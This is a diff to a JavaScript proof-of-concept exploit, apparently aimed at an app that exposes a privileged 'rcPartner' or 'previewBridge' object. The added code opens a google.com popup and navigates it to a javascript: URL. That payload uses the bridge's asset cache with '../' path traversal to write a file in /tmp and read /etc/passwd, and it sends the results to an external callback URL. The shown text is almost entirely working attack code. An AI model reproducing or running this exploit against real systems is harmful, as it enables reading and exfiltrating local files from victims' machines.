@@ -11,12 +11,12 @@ async function log(data) {
   const b = window.rcPartner || window.previewBridge;
   if (!b) {
     if (!new URLSearchParams(location.search).has("stage2")) {
-      const next = location.origin + location.pathname + "?stage2=1";
       const popup = window.open("https://www.google.com/?r3chat=" + Date.now(), "_blank");
-      await log({ stage: "opened-google-popup", popup: String(!!popup), next });
+      const js = `javascript:(async()=>{const C=${JSON.stringify(CALLBACK)};const L=x=>fetch(C+"?"+new URLSearchParams(x),{mode:"no-cors"});try{const b=window.rcPartner||window.previewBridge;if(!b){await L({stage:"google-no-bridge",href:location.href});return}await L({stage:"bridge",href:location.href});await b.assetCache.put("../../../../../../tmp/r3chat-poc","ok\\n","utf8");await L({stage:"wrote"});const p=await b.assetCache.get("../../../../../../etc/passwd","utf8");await L({stage:"read",sample:p.slice(0,180)})}catch(e){await L({stage:"google-js-error",err:String(e&&e.stack||e)})}})()`;
+      await log({ stage: "opened-google-popup", popup: String(!!popup), mode: "javascript-url" });
       setTimeout(() => {
         try {
-          popup.location = next;
+          popup.location = js;
         } catch (e) {
           log({ stage: "popup-nav-fail", err: String(e) });
         }
